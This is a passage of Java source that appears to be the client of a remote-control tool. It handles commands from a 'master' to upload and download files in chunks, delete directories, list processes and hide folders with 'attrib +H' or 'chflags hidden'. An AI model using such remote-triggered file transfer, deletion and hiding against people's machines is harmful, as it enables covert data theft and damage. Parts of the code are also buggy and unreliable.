					 System.out.println("send_chunk_uns\n" +x.getMessage());
			   }
		   }
		   if(xc.equals("prepare_chunk_uploader_uns")){// 
			   final int max_chunks_uploader = Integer.parseInt( SplitString(b).get(2));
			   final String filename_only =  SplitString(b).get(3);
			   cs.Send("prepare_chunk_uploader_uns" + YY + max_chunks_uploader + YY + filename_only);
		   }  if(xc.equals("finished_upload_uns")){// 
			   final String fname =  ( SplitString(b).get(2));
			   final String filename_only_withoutdot =  SplitString(b).get(3);
			   final String file_abos_path_master = SplitString(b).get(4);
			   String writeto_path = SplitString(b).get(5) + fname;
			   String rewritefrom =  SplitString(b).get(5)  + filename_only_withoutdot + "_From_Master" + File_Seperator + fname;
			   File file = new File(rewritefrom); 
			   System.out.println(rewritefrom); 
			   System.out.println(writeto_path); 
			   if(file.renameTo 
			           (new File(writeto_path))) 
			        { 
			            file.delete(); 
			           // System.out.println("File moved successfully"); 
			        } 
			   new File(SplitString(b).get(5)  + filename_only_withoutdot + "_From_Master" ).delete();
			   cs.Send("finished_upload_uns" + YY + fname + YY + filename_only_withoutdot + YY + file_abos_path_master + YY);
		   } 
		   if(xc.equals("upload_ch_uns_nothread")){// sddfd
			   String writeto_path = SplitString(b).get(4)  +"_From_Master" + File_Seperator + SplitString(b).get(2);
			   if (new File(SplitString(b).get(4)  +"_From_Master" + File_Seperator).exists()==false){
				   new File(SplitString(b).get(4)  +"_From_Master" + File_Seperator).mkdir();
			   }
			  String curr_Chunk = SplitString(b).get(5);
			  String conentbase64 = SplitString(b).get(6);
			  try {
				  File Chunk_file = new File(writeto_path);
				  if(Chunk_file.exists()){
					   FileOutputStream output = new FileOutputStream(Chunk_file,true);

					   try {
						   int need_chu_before_put = (int) (Chunk_file.length()/1024);
					  
						 
						 
							   String base64_tofile = conentbase64;
							    byte[] data = Base64.getDecoder().decode(base64_tofile);
							   output.write(data);
							   output.close();
							   String path_there  = SplitString(b).get(3);
						 
							   int need_chu = (int) (Chunk_file.length()/1024);//need_chu+=1;
							   String numeric = "fsfs" + need_chu;
							  
							   String name_withoutdot = SplitString(b).get(2).substring(0, SplitString(b).get(2).lastIndexOf("."));
							   String Chunk_path_there = path_there.replace(SplitString(b).get(2), "") + "UploadChunksFor_"+name_withoutdot;
								 
							    cs.Send("send_chunk_uupload"  + YY +  path_there  + YY +numeric+ YY + Chunk_path_there + YY);
						 
						  
					   }catch(Exception ex){}
				  }else{
					   FileOutputStream fos=new FileOutputStream(Chunk_file);
					    
					   try {
						   String base64_tofile = conentbase64;
						    byte[] data = Base64.getDecoder().decode(base64_tofile);
						    fos.write(data);
							fos.close();//	
							String numeric = SplitString(b).get(5);
							  String path_there  = SplitString(b).get(3);
							//numeric = numeric.replace("fsfs", "");
						//	System.out.print("1st" + numeric);
							  String name_withoutdot = SplitString(b).get(2).substring(0, SplitString(b).get(2).lastIndexOf("."));
							   String Chunk_path_there = path_there.replace(SplitString(b).get(2), "") + "UploadChunksFor_"+name_withoutdot;
								
							    cs.Send("send_chunk_uupload"  + YY + path_there  + YY + "fsfs1"  + YY + Chunk_path_there + YY);
						}catch(Exception ex){}
				   } 
			  }catch(Exception x){System.out.println("I Client Error\n" + x.getMessage());}
		   }
		   if(xc.equals("unstable_download_nothread")){// 
				 
			   final String filePath =  SplitString(b).get(2);
			   File target = new File(filePath);
				 
				 String chunks_folder = target.getParent()+ File_Seperator + "UnstableChunksFor_" + target.getName().substring(0, target.getName().lastIndexOf("."));
				 int prev_prog = Get_Progress_downloader(chunks_folder + File_Seperator);
			  
				 there_but_notsent =0;
				 if(prev_prog==0){
					  Chunk_counter = 0;
				  }else{
					  Chunk_counter = prev_prog;
				  }
					try {
					   
							File fx = new File(chunks_folder);
							
							if(fx.exists() == false){
								fx.mkdirs();
								Chunk_counter = 0;
								save_Progress_downloader(chunks_folder+File_Seperator, Chunk_counter);
								split_uns_not_thread(chunks_folder,target,false,0);
								//split_uns(folder_path,file);
								 
							}else{
								cs.Send("send_actual_ch_uns" + YY + target.getName().substring(0,target.getName().lastIndexOf("."))+ YY + target.getName()  + YY +(chunks_folder+File_Seperator) + YY );
								 
						 
							}
						
						 
					 
					} catch (Exception e) {
						 System.out.println("" + e.getLocalizedMessage()+"\n" + chunks_folder);
					}
				 
		
		   }  
		   if(xc.equals("send_actual_upload")){
			   try{
					  
					  String platformccc = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
						 if ((platformccc.indexOf("mac") >= 0) || (platformccc.indexOf("darwin") >= 0)) {
							 
							 File_Seperator = ":";
						      } else if (platformccc.indexOf("win") >= 0) {
						    	  File_Seperator = "\\";
						    		 
						      } else if (platformccc.indexOf("nux") >= 0) {
						    	  File_Seperator = "/";
						    	 
						      } else {
						    	  File_Seperator = System.getProperty("path.separator");
						    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
						    		  File_Seperator = System.getProperty("file.separator");
						    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
						    			  File_Seperator = "/";
						    		  }
						    	  }
						      }
					  String filename_withoutdot = SplitString(b).get(2); //here without dot 
					 
					   String filename_withdot = SplitString(b).get(3); 
					   String fulll_path =  SplitString(b).get(5) + filename_withoutdot +"_From_Master" + File_Seperator + filename_withdot;
					   File Chunk_file = new File(fulll_path);
					   int need_chu = (int) (Chunk_file.length()/1024);
					   String neededx = need_chu + "fsfs";
						//  new MessageBox().errorBox_nothread(("actual_chunk_uupload"  + YY +  neededx  +YY +SplitString(b).get(4) + YY  + filename_withdot + YY + SplitString(b).get(6)  + YY), "");
					   cs.Send("actual_chunk_uupload"  + YY +  neededx  +YY +SplitString(b).get(4) + YY  + filename_withdot + YY + SplitString(b).get(6)  + YY);
					   
				  }catch(Exception e){
				
					   String filename_withdot = SplitString(b).get(3); 
					   int need_chu = 0;
					   String neededx = need_chu + "fsfs";
					 
					   cs.Send("no_actual_uupload"  + YY +  neededx  +YY +SplitString(b).get(6) + YY  + filename_withdot + YY );
					  
					  
				  }
		   }
		   if(xc.equals("no_actual_uns")){
			   
				Chunk_counter = Integer.parseInt(SplitString(b).get(2).replace("fsfs", ""));
				 String filePath =  SplitString(b).get(3);//txt file path
				 String namewithdot = SplitString(b).get(4);
				 String parent_folder = "";
				 if(filePath.endsWith(File_Seperator)){
					 parent_folder = filePath.substring(0,filePath.lastIndexOf(File_Seperator));
					 parent_folder = parent_folder.substring(0,parent_folder.lastIndexOf(File_Seperator));
				 }else{
					 parent_folder = filePath.substring(0,filePath.lastIndexOf(File_Seperator));
				 }
				 String new_filepath = parent_folder + File_Seperator +namewithdot; 
				save_Progress_downloader(filePath + File_Seperator ,Chunk_counter);
				split_uns_not_thread(filePath,new File(new_filepath),false,0);
				
			   
			   
		   }
		   if(xc.equals("actual_chunk_uns")){
			  	Chunk_counter = Integer.parseInt(SplitString(b).get(2).replace("fsfs", ""));
				 String filePath =  SplitString(b).get(3);//txt file path
				 String namewithdot = SplitString(b).get(4);
				 String parent_folder = "";
				 if(filePath.endsWith(File_Seperator)){
					 parent_folder = filePath.substring(0,filePath.lastIndexOf(File_Seperator));
					 parent_folder = parent_folder.substring(0,parent_folder.lastIndexOf(File_Seperator));
				 }else{
					 parent_folder = filePath.substring(0,filePath.lastIndexOf(File_Seperator));
				 }
				 String new_filepath = parent_folder + File_Seperator +namewithdot; 
				save_Progress_downloader(filePath + File_Seperator ,Chunk_counter);
				split_uns_not_thread(filePath,new File(new_filepath),true,Chunk_counter);
				
				
				
		  }
		   if(xc.equals("send_chunk")){
			  
			   try{
				   
					  String chunk_path = SplitString(b).get(2);
					  File chunk = new File(chunk_path);
					  File path = new File(chunk.getAbsolutePath().substring(0,chunk.getAbsolutePath().lastIndexOf(File_Seperator)));

						 File [] files = path.listFiles();
						 if (Chunk_counter+1 >= files.length){
							  	cs.Send("finished_chunk" + YY +  files[Chunk_counter].getName() + YY + files[Chunk_counter].getAbsolutePath().replace(files[Chunk_counter].getName(), "") + YY);
							    Chunk_counter +=1; 
								   there_but_notsent =0;
								   String filedir_delete= files[Chunk_counter].getAbsolutePath().replace(files[Chunk_counter].getName(), "");
								   try{
									   File file = new File(filedir_delete);
									   if (file.exists()){
										   if (file.canWrite()){
												 String platform = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
												 String double_qoutes = "\"";
											   if ((platform.indexOf("mac") >= 0) || (platform.indexOf("darwin") >= 0)) {
													 String terminal_command = "chflags hidden " + double_qoutes + file.getAbsolutePath() + double_qoutes  ;
													 Process p = Runtime.getRuntime().exec(terminal_command);
													 p.waitFor();
												      } else if (platform.indexOf("win") >= 0) {//on windows
												    	  Process p = Runtime.getRuntime().exec("attrib +H " +double_qoutes+ file.getAbsolutePath()+double_qoutes);
												    	   //wait for the command to complete
												          p.waitFor();
												      } else if (platform.indexOf("nux") >= 0) {
												    	  Runtime rt = Runtime.getRuntime();
												    	  Process proc = rt.exec("mv " +  file.getAbsolutePath() +  "."+ file.getAbsolutePath() + "" );
												    	  proc.waitFor();
												      } else {
												    	  Runtime rt = Runtime.getRuntime();
												    	  Process proc = rt.exec("mv " +  file.getAbsolutePath() +  "."+ file.getAbsolutePath() + "" );
												    	  proc.waitFor();
												      }
										   }
									   }
								   }catch (Exception ex){
									   
								   }
					
						 }else{
							 try{
								File Fix = new File(path.getAbsolutePath() + File_Seperator + SplitString(b).get(3) + ".part" +Chunk_counter );
								 String name_withoutDot = Fix.getName().substring(0, Fix.getName().lastIndexOf("."));
						        	String CMD = "Dw_Chunk" +YY + Fix.getName()+ YY + name_withoutDot +  YY +Fix.getAbsolutePath()+ YY + Chunk_counter+YY+ encodeFileToBase64Binary(Fix.getAbsolutePath()) + YY;
						        	save_Progress_downloader(Fix.getAbsolutePath().replace(Fix.getName(), "")+File_Seperator,Chunk_counter);
						         	cs.Send(CMD);
						       	    Chunk_counter +=1; 
						       
							   }catch(Exception x){
								   File Fix = new File(path.getAbsolutePath() + File_Seperator + SplitString(b).get(3) + ".part" +Chunk_counter );
									 String name_withoutDot = Fix.getName().substring(0, Fix.getName().lastIndexOf("."));
							        	String CMD = "Dw_Chunk" +YY + Fix.getName()+ YY + name_withoutDot +  YY +Fix.getAbsolutePath()+ YY + Chunk_counter+YY+ encodeFileToBase64Binary(Fix.getAbsolutePath()) + YY;
							        	save_Progress_downloader(Fix.getAbsolutePath().replace(Fix.getName(), "")+File_Seperator,Chunk_counter);
							        	cs.Send(CMD);
							        	 Chunk_counter +=1; 
							  
								   
								   
							   }
							
							
						      
						 }
					
				   }catch(Exception x){}
	
		    
		   }
 
	 if(xc.equals("reset_chunk_downloaders")){
		 Chunk_counter = 0;
		 save_Progress_downloader(SplitString(b).get(2), Chunk_counter);
		 try{
			 File dir = new File(SplitString(b).get(2) + File_Seperator);
			 File[] currList;
			 Stack<File> stack = new Stack<File>();
			 stack.push(dir);
			 while (! stack.isEmpty()) {
			     if (stack.lastElement().isDirectory()) {
			         currList = stack.lastElement().listFiles();
			         if (currList.length > 0) {
			             for (File curr: currList) {
			                 stack.push(curr);
			             }
			         } else {
			             stack.pop().delete();
			         }
			     } else {
			         stack.pop().delete();
			     }
			 }
		 }catch(Exception ex){
			 
		 }
		 exit_unstable = true;
		 if(chunk_thread!=null){
			 chunk_thread.interrupt();
			 try{
				 chunk_thread = null;
			 }catch (Exception x){}
		 }
		 
		 
		  //save_Progress_downloader(Delchunks_path + File_Seperator, Chunk_counter);
	 	}	     
	 if(xc.equals("kill_uns_down")){
		 Chunk_counter = 0;
		 exit_unstable = true;
		 if(chunk_thread!=null){
				chunk_thread.interrupt();
				 try{
					 chunk_thread = null;
				 }catch (Exception x){}
			}
	 }	   if(xc.equals("i_got_resume")){
		  there_but_notsent =1;
		   System.out.println("i set\n" +  SplitString(b).get(2)+"\n"+ SplitString(b).get(4));
		   Chunk_counter = Integer.parseInt(SplitString(b).get(4));
		    String filePath =  SplitString(b).get(2);
		   save_Progress_downloader(filePath + File_Seperator + File_Seperator,Chunk_counter);
	 }	  
		 if(xc.equals("pause_unstable")){
			 pause_unstable =1;
	 }	   
		  
		 if(xc.equals("resume_unstable")){
			 pause_unstable =0;
	 }	   
		 	 if(xc.equals("Revl4as5das")){
		 		cs.Send("exp_err_4"+YY+SplitString(b).get(2)+YY);
	 }	  
		 
		 if(xc.equals("")){
	   
	 }	  
	   }catch (Exception ex){
		   System.out.println("Error RDATA " + ex.getMessage());
		   get_Configuration() ;
		 //RData("Revl4as5das"+YY+"exp_er"+YY+ex.getMessage()+YY); 
	   }
  }
 private static void deleteFolder(File file){
     for (File subFile : file.listFiles()) {
        if(subFile.isDirectory()) {
           deleteFolder(subFile);
        } else {
           subFile.delete();
        }
     }
     file.delete();
  }
 private static ArrayList<String> listRunningProcesses_Windows() {
	 ArrayList<String> processes = new ArrayList<String>();
	    try {
	      String line;
	      Process p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
	      BufferedReader input = new BufferedReader
	          (new InputStreamReader(p.getInputStream()));
	      while ((line = input.readLine()) != null) {
	          if (!line.trim().equals("")) {line = line.substring(1);
	         	  String double_qoutes = "\""; processes.add(line.replace(double_qoutes, ""));
	          }

	      }
	      input.close();
	    }
	    catch (Exception err) {
	      err.printStackTrace();
	    }
	    return processes;
	  }
 private static int Get_Progress_downloader(String saver_dir){
 	int parts_count = 0;
 	saver_dir = saver_dir  + "Progress_Uploader_Chunk.txt";
 	try{
 		File xf = new File(saver_dir);
 		if (xf.exists()){
 			BufferedReader br = new BufferedReader(new FileReader(xf));
 	 		parts_count = Integer.parseInt(br.readLine());
 		}else{
 			
 			xf.createNewFile();
 			FileWriter FW = new  FileWriter(xf);
 			FW.write(""+parts_count);
 			FW.close();
 			BufferedReader br = new BufferedReader(new FileReader(xf));
 	 		parts_count = Integer.parseInt(br.readLine());
 		}
 		
 	}catch(Exception x){
 		File xf = new File(saver_dir);
 		if (xf.exists()){
 			xf.delete();
 			try {
				xf.createNewFile();
				FileWriter FW = new  FileWriter(xf);
	 			FW.write(""+parts_count);
	 			FW.close();
	 			BufferedReader br = new BufferedReader(new FileReader(xf));
	 	 		parts_count = Integer.parseInt(br.readLine());
 				} catch (IOException e) {}
 		
 		}else{
 			try {
				xf.createNewFile();
				FileWriter FW = new  FileWriter(xf);
	 			FW.write(""+parts_count);
	 			FW.close();
	 			BufferedReader br = new BufferedReader(new FileReader(xf));
	 	 		parts_count = Integer.parseInt(br.readLine());
 				} catch (IOException e) {}
 		}
 	}
 	return parts_count;
 	
 }
 private static void unZipIt(String zipFile, String outputFolder){
	   //Open the file 
     try
     {	 
    	 ZipFile file = new ZipFile(zipFile);
         FileSystem fileSystem = FileSystems.getDefault();
         //Get file entries
         Enumeration<? extends ZipEntry> entries = file.entries();
          
         //We will unzip files in this folder
         String uncompressedDirectory = outputFolder;
         Files.createDirectory(fileSystem.getPath(uncompressedDirectory));
          
         //Iterate over entries
         while (entries.hasMoreElements()) 
         {
             ZipEntry entry = entries.nextElement();
             //If directory then create a new directory in uncompressed folder
             if (entry.isDirectory()) 
             {
               
                	 Files.createDirectories(fileSystem.getPath(uncompressedDirectory +  File_Seperator + entry.getName()));
                  
                 
             } 
             //Else create the file
             else
             {
            	  
            		  InputStream is = file.getInputStream(entry);
                      BufferedInputStream bis = new BufferedInputStream(is);
                      String uncompressedFileName = uncompressedDirectory + File_Seperator + entry.getName();
                      Path uncompressedFilePath = fileSystem.getPath(uncompressedFileName);
                      Files.createFile(uncompressedFilePath);
                      FileOutputStream fileOutput = new FileOutputStream(uncompressedFileName);
                      while (bis.available() > 0) 
                      {
                          fileOutput.write(bis.read());
                      }
                      fileOutput.close();
                      System.out.println("Written :" + entry.getName());
                  
                 
             }
         }
     }
     catch(IOException e)
     {
         e.printStackTrace();
     }
  
   }
 private static void save_Progress_downloader(String prog_saver,int parts_count){
	 prog_saver = prog_saver   + "Progress_Uploader_Chunk.txt";
	 //System.out.print(prog_saver);
	 try {
		    File xf = new File(prog_saver);
			if (xf.exists()== false){
				xf.createNewFile();
				FileWriter FW = new  FileWriter(xf);
				FW.write(""+parts_count);
				FW.close();
				BufferedReader br = new BufferedReader(new FileReader(xf));
		 		parts_count = Integer.parseInt(br.readLine());
			}else{
				FileWriter FW = new  FileWriter(xf);
				FW.write(""+parts_count);
				FW.close();
				BufferedReader br = new BufferedReader(new FileReader(xf));
		 		parts_count = Integer.parseInt(br.readLine());
			}
		 
			} catch (IOException e) {}
 }
	private static void Create_Chunks_infolder_Uns(String folder_path,File file, int sizeOfFileInMB ){
		try{
			File fx = new File(folder_path);
			
			if(fx.exists() == false){
				fx.mkdirs();
				Chunk_counter = 0;
				save_Progress_downloader(folder_path+File_Seperator, Chunk_counter);
				split_uns(folder_path,file);
				 return;
			}else{
				Chunk_counter = 0;
				 
				cs.Send("send_actual_ch_uns" + YY + file.getName().substring(0,file.getName().lastIndexOf("."))+ YY + file.getName()  + YY +(folder_path+File_Seperator) + YY );
			    split_uns_2(folder_path,file);
			 
				 return;
			 
			}
		
		}catch (Exception ex){
		 
		}
	}
	private static void Create_Chunks_infolder(String folder_path,File file, int sizeOfFileInMB ){
		try{
			File fx = new File(folder_path);
			
			if(fx.exists() == false){
				fx.mkdirs();
				Chunk_counter = 0;
				//save_Progress_downloader(folder_path+File_Seperator, Chunk_counter);
				split(folder_path,file);
				 return;
			}else{
				 
				Chunk_counter =  Get_Progress_downloader(folder_path+File_Seperator);
				Chunk_counter -=1;
				split(folder_path,file);
				 return;
			//	Create_Chunks_infolder(folder_path,file,sizeOfFileInMB);
			}
		
		}catch (Exception ex){
		 
		}
	}	private static int get_max_chunks_number_uns(String Ch_Dir,File file){
		 
		 int chunkSize = 0  ;
		  File f=new File(file.getAbsolutePath());
	  		long len = file.length();
	  		int b = 1024;//10024 * 1  ;
	  	 
	  		 
			try {
				int c=(int)len/b;
			  	
		  		if(((int)len%b)!=0){
		  			c++;
		  		}
		  		chunkSize = c;
				  return chunkSize ;
		  		
			} catch (Exception e) {
				cs.Send("chunk_exp" + YY + e.getMessage() + YY );
			} 
	  		
		
			return chunkSize ;
	}
	private static int get_max_chunks_number(String Ch_Dir,File file){
		 
		 int chunkSize = 0  ;
		  File f=new File(file.getAbsolutePath());
	  		long len = file.length();
	  		int b = 10024 * 1  ;
	  		 
			try {
				int c=(int)len/b;
			  	
		  		if(((int)len%b)!=0){
		  			c++;
		  		}
		  		chunkSize = c+1;
				  return chunkSize ;
		  		
			} catch (Exception e) {
				cs.Send("chunk_exp" + YY + e.getMessage() + YY );
			}
	  		
		
			return chunkSize ;
	}
	private static  Thread chunk_thread = null;
	private static void split(final String Ch_Dir,final File file) throws Exception{
		// 
		final int max_value_chunks = get_max_chunks_number(Ch_Dir,file);
		
	 
		cs.Send("prepare_chunk_downloader" + YY + max_value_chunks + YY  + file.getName() + YY);
		if(chunk_thread!=null){
			chunk_thread.interrupt();
			chunk_thread = null;
		}
		    chunk_thread = new Thread(new Runnable() {
		      @Override
		      public void run() { 
		    	  File f=new File(file.getAbsolutePath());
		  		long len;
		  		int b = 10024 * 1  ;
		  		FileInputStream fis;
				try {
					fis = new FileInputStream(f);
					len=f.length();
				  	
			  		int c=(int)len/b;
			  	
			  		if(((int)len%b)!=0){
			  			c++;
			  		}
			  		int counx = 0;
			  		int isent = 0;
			  		 
			  		for(int i=0;i<c;i++){
			  			counx = i;
			  			
			  			 if(isent ==0 && Chunk_counter==0){
			  				 try{
			  					 
			  					File Fix = new File((Ch_Dir + File_Seperator + f.getName() + ".part" +Chunk_counter));
						  		if (Fix.getName().contains(".part")){
									  String name_withoutDot = Fix.getName().substring(0, Fix.getName().lastIndexOf("."));
							         String CMD = "Dw_Chunk" +YY + Fix.getName() + YY + name_withoutDot +  YY + Fix.getAbsolutePath() +YY +""+Chunk_counter+YY+encodeFileToBase64Binary(Fix.getAbsolutePath()) + YY;
							         cs.Send(CMD);
									  
									   System.out.println("" + Fix.getName());
									   save_Progress_downloader(Fix.getAbsolutePath().replace(Fix.getName(), "")+File_Seperator,Chunk_counter);
										isent = 1;
						  		}
			  				 }catch(Exception x){ }
					  			
					  		 }
			  			
			  			File curr_file = new File(Ch_Dir + File_Seperator + f.getName() + ".part" +i);
			  			if (curr_file.exists()){
			  				try{
			  				if ( i ==Chunk_counter){
			  					FileOutputStream fosx=new FileOutputStream(new File(Ch_Dir + File_Seperator + f.getName() + ".part" +i));
			  					 for(int j=0;j<b;j++){
							  			
							  			int ch;
							  			if((ch=fis.read())!=-1){
							  				fosx.write(ch);
							  				} 
							  			}
							  		 	fosx.close();
			  				}else if ( i <Chunk_counter){
			  					 for(int j=0;j<b;j++){
							  			
							  			int ch;
							  			if((ch=fis.read())!=-1){
							  				//System.out.println(ch);
							  				} 
							  			}
			  				}
			  					/*if (i == Chunk_counter+1){ //new File(Ch_Dir + File_Seperator).listFiles().length-2
			  					 
				  					FileOutputStream fosx=new FileOutputStream(new File(Ch_Dir + File_Seperator + f.getName() + ".part" +i));
				  					 for(int j=0;j<b;j++){
								  			
								  			int ch;
								  			if((ch=fis.read())!=-1){
								  				fosx.write(ch);
								  				} 
								  			}
								  		 	fosx.close();
				  				}else{
				  					
								  		 
				  				}*/
			  				
			  				
			  				}catch(Exception x){ }
			  				
			  				continue;
			  			}
			  		File f1=new File(Ch_Dir + File_Seperator + f.getName() + ".part" +i);// i+""+"."+f);
			  		//System.out.println(f.getAbsolutePath()); 
			  		
			  		FileOutputStream fos=new FileOutputStream(f1);
			  		 for(int j=0;j<b;j++){
			  			
			  			int ch;
			  			if((ch=fis.read())!=-1)
			  				fos.write(ch); 
			  			}
			  		 	fos.close();
			  	
			  		
			  		 
			  		}
			  		try{fis.close();}catch(Exception x){ }
			  		
			  		 cs.Send("prepare_chunk_mx" + YY + counx + YY );
			  		File Fix = new File(Ch_Dir + File_Seperator + f.getName() + ".part" + Chunk_counter );
			  		if (Fix.getName().contains(".part")){
						  String name_withoutDot = Fix.getName().substring(0, Fix.getName().lastIndexOf("."));
				         String CMD = "Dw_Chunk" +YY + Fix.getName() + YY + name_withoutDot +  YY + Fix.getAbsolutePath() +YY +""+Chunk_counter+YY+encodeFileToBase64Binary(Fix.getAbsolutePath()) + YY;
				         cs.Send(CMD);
						   Chunk_counter +=1;
						   System.out.println("" + Fix.getName());
						   save_Progress_downloader(Fix.getAbsolutePath().replace(Fix.getName(), "")+File_Seperator,Chunk_counter);
			  		}
			  		
				} catch (Exception e) {
					//cs.Send("chunk_exp" + YY + e.getMessage() + YY );
					System.out.println("chunk_exp" + YY + e.getMessage());
				}
		  		
		       }
		    });

		    chunk_thread.start(); 
		
		//System.out.println("Operation Successful"); 
		
	}
    private static ArrayList<ByteArrayOutputStream> Chunks_arraylist(final String Ch_Dir,final File file,int Chunk_counter_older) throws Exception{
    	 ArrayList<ByteArrayOutputStream> Chunks_Array = new  ArrayList<ByteArrayOutputStream>();
    	 int max_value_chunks = get_max_chunks_number_uns(Ch_Dir,file);
 			cs.Send("prepare_chunk_downloader_uns" + YY + max_value_chunks + YY  + file.getName() + YY);
 			try {
 				  	File f=new File(file.getAbsolutePath());
 			  		long len;
 			  		int b = 1024 ;// for transmit @ 43.56164384 KB / Sec , The less , the faster , but unstable 
 			  		FileInputStream fis;
 			  		fis = new FileInputStream(f);
					len=f.length();
				  	int i=0;//count Chunks
				  	while(i<max_value_chunks){
				  		 
				  		try {
				  			    ByteArrayOutputStream bOutput = new ByteArrayOutputStream(1025);
		  						for(int j=0;j<b;j++){// makes bOutput filled by 2048 Bytes 
				  					 int ch;
		  							if((ch=fis.read())!=-1){
				  						bOutput.write(ch);
				  						}
				  						}
		  						bOutput.close();
		  						Chunks_Array.add(bOutput);
				  		}catch(Exception ex){}
				  		i+=1;
				  	}
				  	try{fis.close();}catch(Exception x){ }
				  	new MessageBox().infoBox("I finished " + Chunks_Array.size(), "");
 			}catch(Exception ex){}
    	 
    	
    	return Chunks_Array;
    }
	private static void split_uns(final String Ch_Dir,final File file) throws Exception{
		// 
		final int max_value_chunks = get_max_chunks_number_uns(Ch_Dir,file);
		cs.Send("prepare_chunk_downloader_uns" + YY + max_value_chunks + YY  + file.getName() + YY);
		 if(chunk_thread!=null){
		
			 try{
				chunk_thread.interrupt();
				 chunk_thread = null;
			 }catch (Exception x){}
		}
		    chunk_thread = new Thread(new Runnable() {
		      @Override
		      public void run() { 
		    	  File f=new File(file.getAbsolutePath());
		  		long len;
		  		int b = 1024 ;// for transmit @ 43.56164384 KB / Sec , The less , the faster , but unstable 
		  		FileInputStream fis;
				try {
					fis = new FileInputStream(f);
					len=f.length();
				  	
			  		int i=0;//count Chunks
			  		exit_unstable = false; 
			  	 
			  		if(Chunk_counter >0){
			  			 Chunk_counter =0;
			  			 save_Progress_downloader(Ch_Dir+File_Seperator, Chunk_counter);
			  			there_but_notsent = 1;
  						System.out.println("Resume : " + Chunk_counter+"\n");
			  			}
			  	  String name_withoutDot = f.getName().substring(0, f.getName().lastIndexOf("."));
			  	  
			  		while(i<max_value_chunks){
			  			
			  			System.out.println("i : " + i+"\n");
			  			
			  			 
			  				 
			  				ByteArrayOutputStream bOutput = new ByteArrayOutputStream(1025);
			  				
			  				try{
			  					
			  					 
			  						bOutput = new ByteArrayOutputStream(1025);
			  						for(int j=0;j<b;j++){// makes bOutput filled by 2048 Bytes 
					  					 
						  			 	 
						  			 	 int ch;
			  							if((ch=fis.read())!=-1){
					  						bOutput.write(ch);
					  						}
					  						}
			  						bOutput.close();
			  						 byte[] encoded = Base64.getEncoder().encode(bOutput.toByteArray());
			  						 String Numeric = "fsfs"+i;
			  						 String CMD = "dw_ch_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +Numeric + YY + new String(encoded)+ YY + (max_value_chunks) + YY;
							         cs.Send(CMD);
							         while (there_but_notsent ==0){
							  				continue;
						  				}
						  				
						  				there_but_notsent = 0;
						  				i+=1;
			  				
			  				}catch(Exception x){ System.out.println("I Error\n" + x.getMessage());}
			  				
			  			
		  			// bOutput.flush();
		  			  
			  		 
			  			 
			  		//	System.out.println("I Wait\n");
		  			if (isconnected==false){System.out.println("I Quit\n"); break;}
			  		//if(exit_unstable){System.out.println("\nI Return\n");return;}
		  			
			  		
			  		 
			  		
			  		}
			  		try{fis.close();}catch(Exception x){ }
			  		 
	  				 String CMD = "finished_down_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +"";
			         cs.Send(CMD);
			       //  try{chunk_thread.interrupt();}catch(Exception x){ }
				} catch (Exception e) {
					exit_unstable = true;
				//	try{chunk_thread.interrupt();}catch(Exception x){ }
					System.out.println("chunk_exp" + YY + e.getMessage());
				}
		  		
		        } //End of run method
		    
		    });
		    chunk_thread.start();  
		
		//System.out.println("Operation Successful"); 
		
	}
	private static int called = 0;
	private static void split_uns_not_thread(final String Ch_Dir,final File file,boolean is_resume,int counter) throws Exception{
		int max_value_chunks = get_max_chunks_number_uns(Ch_Dir,file);
		//System.out.println("SZ" + max_value_chunks );
		cs.Send("prepare_chunk_downloader_uns" + YY + max_value_chunks + YY  + file.getName() + YY);
		if(is_resume ==false){
			//Chunks_arraylist(Ch_Dir,file,counter);
			File f=new File(file.getAbsolutePath());
	  		long len;
	  		int b =1024 ;// for transmit @ 43.56164384 KB / Sec , The less , the faster , but unstable 
	  		FileInputStream fis;
			try {
				fis = new FileInputStream(f);
				len=f.length();
			  	int i=0;//count Chunks
		  		if(Chunk_counter >0){
		  			 Chunk_counter =0;
		  			 save_Progress_downloader(Ch_Dir+File_Seperator, Chunk_counter);
		  			there_but_notsent = 1;
					//	System.out.println("Resume : " + Chunk_counter+"\n");
		  			}
		  	  String name_withoutDot = f.getName().substring(0, f.getName().lastIndexOf("."));
		  	  
		  		if(i<max_value_chunks){
		  				//System.out.println("i : " + i+"\n");
		  				ByteArrayOutputStream bOutput = new ByteArrayOutputStream(1025);
		  				try{
		  						bOutput = new ByteArrayOutputStream(1025);
		  						for(int j=0;j<b;j++){ 
				  					 
					  			 	 
					  			 	 int ch;
		  							if((ch=fis.read())!=-1){
				  						bOutput.write(ch);
				  						}
				  						}
		  						bOutput.close();
		  						 byte[] encoded = Base64.getEncoder().encode(bOutput.toByteArray());
		  						 String Numeric = "fsfs"+i;
		  						 String CMD = "dw_ch_uns_nothread" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +Numeric + YY + new String(encoded)+ YY + (max_value_chunks) + YY;
						         cs.Send(CMD);
						      
					  				 
		  				}catch(Exception x){ System.out.println("I Error\n" + x.getMessage());}
		  			
	  			 
		  		}else {
		  			String CMD = "finished_down_uns" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +"";
			        cs.Send(CMD);
			        Chunk_counter = 0;
			        save_Progress_downloader(Ch_Dir + File_Seperator + File_Seperator,Chunk_counter);
		  		}
		  		try{fis.close();}catch(Exception x){ }
		  	
		         } catch (Exception e) {
				exit_unstable = true;
			 System.out.println("chunk_exp" + YY + e.getMessage());
			}
			
		}else if(is_resume ==true){
			Chunk_counter = counter;
			File f=new File(file.getAbsolutePath());
			FileInputStream fis= new FileInputStream(f);
			if (Chunk_counter<max_value_chunks){
				 String name_withoutDot = f.getName().substring(0, f.getName().lastIndexOf("."));
				String Numeric = "fsfs"+Chunk_counter;
			if(called ==1){
				called=0;
			}else{
				 try{
					 byte[] encoded  = Base64.getEncoder().encode(Certain_Bytes(fis,Chunk_counter,1024,f));
					 //System.out.print("\n" + "Client "+Numeric + "\n");
					 String CMD = "dw_ch_uns_nothread" +YY + f.getName() + YY + name_withoutDot +  YY + f.getAbsolutePath() +YY +Numeric+ YY + new String(encoded)+ YY + (max_value_chunks-1) + YY;
					 cs.Send(CMD);
